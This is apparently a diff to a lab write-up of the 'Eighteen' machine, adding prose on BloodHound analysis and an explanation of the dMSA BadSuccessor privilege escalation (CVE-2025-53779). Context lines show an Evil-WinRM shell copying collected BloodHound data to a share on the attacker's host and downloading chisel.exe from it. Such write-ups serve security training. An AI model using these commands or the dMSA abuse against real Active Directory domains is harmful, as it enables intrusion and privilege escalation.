@@ -269,11 +269,14 @@ The command completed successfully.
 *Evil-WinRM* PS C:\programdata> copy 20261109174631_BloodHound.zip \\10.10.14.77\share\
 ```
 
-To analyse the results, I made use of the bloodhound docker file [found here](https://github.com/SpecterOps/BloodHound/wiki/Development) to easily spin up and down the container. 
+To analyse the results, I made use of the bloodhound docker file [found here](https://github.com/SpecterOps/BloodHound/wiki/Development) to easily spin up and down the GUI. Bloodhound uses a graph database to visualise the active directory relationships, an example of which can be seen in the example below. I searched for the user object adam.scott since I had already compromised their account. Unfortunately he did not seem to have any interesting permissions over other objects, only objects of a higher permission level could alter the account.
 
-
+![Bloodhound results for the Eighteen machine](./eighteen-bloodhound.png)
 
 ## Bad Successor
+
+With the explore into bloodhound not revealing anything concrete to go from, I searched for priv esc vulnerabilities associated with the windows server 2025 datacenter. Very quickly, CVE-2025-53779 began to stand out as a likely candidate, with several articles explaining the mechanism behind the exploit. In particular the [Akamai article](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory), who I beleve were first to break the news of this vulnerability, was especially useful in improving my understanding. The vulnerability relies on a feature implemented in windows datacenter 2025 to migrate legacy service accounts to the latest authentication mechanisms provided by kerberos. Typically, when a legacy service account would request permission from the Ticket Granting Ticket (TGT) server, the server would migrate the legacy account to a delegated managed service account (dMSA). However, if an attacker has the ability to make a dMSA manually and the attacker can control the migration status of that dMSA, the attacker can convince the TGT server that the dMSA they control should be granted the permissions of another account. In the worst case scenario, the attacker could convince the TGT server that the dMSA should inherit the administrators permissions, effectively granting the attacker an account that can perform actions as if they were the administrator.
+
 
 ```bash
 *Evil-WinRM* PS C:\programdata> wget http://10.10.14.77:8080/chisel.exe -outfile chisel.exe
